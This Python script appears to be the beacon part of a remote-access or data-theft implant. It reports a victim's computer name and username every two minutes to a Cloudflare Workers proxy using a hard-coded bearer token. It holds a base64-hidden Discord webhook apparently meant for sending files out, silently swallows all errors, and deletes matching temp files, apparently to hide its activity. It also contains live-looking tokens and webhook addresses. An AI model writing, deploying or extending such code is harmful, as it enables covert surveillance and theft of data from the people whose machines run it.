import string, base64, json, re, math, uuid, importlib, subprocess
import os, socket, tempfile, sys, shutil
import urllib.request
import time
from pathlib import Path

WORKER_URL = "https://webhookproxy.anna-benbekthi.workers.dev/"
PROXY_TOKEN = "389e0e62eaf14340b5e16d90ed1b56d79a14e07484a404bb30f0a3e9b7f64c66"

FILE_WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNDUzNDE5ODU0NTk0MDU2MS92c0dhXzVaTTFFU2NaUlFKTU5qdWpTWm5mYnFXWEtXRm00S3Zqd1JwU29HQmdlN0NVYlluMHJSV18wYWZhY3k3czIzNQ=="

MAX_FILE_SIZE = 8 * 1024 * 1024

try:
    import pyautogui
    import requests
except:
    sys.exit()

def send_webhook(message):
    payload = json.dumps({
        "message": message
    }).encode("utf-8")

    req = urllib.request.Request(
        WORKER_URL,
        data=payload,
        method="POST",
        headers={
            "Content-Type": "application/json",
            "Authorization": f"Bearer {PROXY_TOKEN}",
            "User-Agent": "Mozilla/5.0 (DiscordWebhook)"
        }
    )

    try:
        with urllib.request.urlopen(req, timeout=15) as response:
            result = json.loads(response.read().decode("utf-8"))
            return response.status == 200 and result.get("ok") is True

    except Exception:
        return False

def heartbeat():
    global FIRST_MESSAGE

    if FIRST_MESSAGE:
        msg = START_DATA
    else:        
        msg = ALIVE_DATA
    
    sent = send_webhook(msg)
    if sent and FIRST_MESSAGE:
        FIRST_MESSAGE = False

def cleanup_named_tempfiles():
    AGE_THRESHOLD = 60 
    temp_dir = tempfile.gettempdir()
    now = time.time()

    pattern = re.compile(r'^tmp[^.]{8}\.[^.]{3}$')
    for filename in os.listdir(temp_dir):
        if not pattern.match(filename):
                continue

        filepath = os.path.join(temp_dir, filename)

        if not os.path.isfile(filepath):
            continue

        try:
            mtime = os.path.getmtime(filepath)

            if now - mtime < AGE_THRESHOLD:
                continue

            os.remove(filepath)

        except PermissionError:
            pass
        except Exception as e:
            pass




if __name__ == "__main__":
    COMPUTER_NAME = os.environ.get("COMPUTERNAME", socket.gethostname())
    USER_NAME = os.environ.get("USERNAME", "SYSTEM")

    try:
        LOADER_VERSION = LOADER_VERSION
    except:
        LOADER_VERSION = "1.0"

    START_DATA = json.dumps({'info':'script_started', 'loader_version':LOADER_VERSION ,'script':'user','computer':COMPUTER_NAME,'username':USER_NAME})
    ALIVE_DATA = json.dumps({'info':'alive','script':'user','computer':COMPUTER_NAME,'username':USER_NAME})

    FIRST_MESSAGE = True

    loop_function_list = [
        {
            "func": cleanup_named_tempfiles,
            "args": [],
            "interval": 60,  # seconds
            "next_run": time.monotonic(),
        },
        {
            "func": heartbeat,
            "args": [],
            "interval": 120,  # seconds
            "next_run": time.monotonic(),
        }
    ]
    
    while True:
        now = time.monotonic()
        nearest_next_run = None

        for task in loop_function_list:
            if now >= task["next_run"]:
                task["next_run"] += task["interval"]
                try:
                    task["func"](*task["args"])
                except Exception:
                    pass

            if nearest_next_run is None or task["next_run"] < nearest_next_run:
                nearest_next_run = task["next_run"]

        sleep_time = max(0, nearest_next_run - time.monotonic())
        time.sleep(sleep_time)
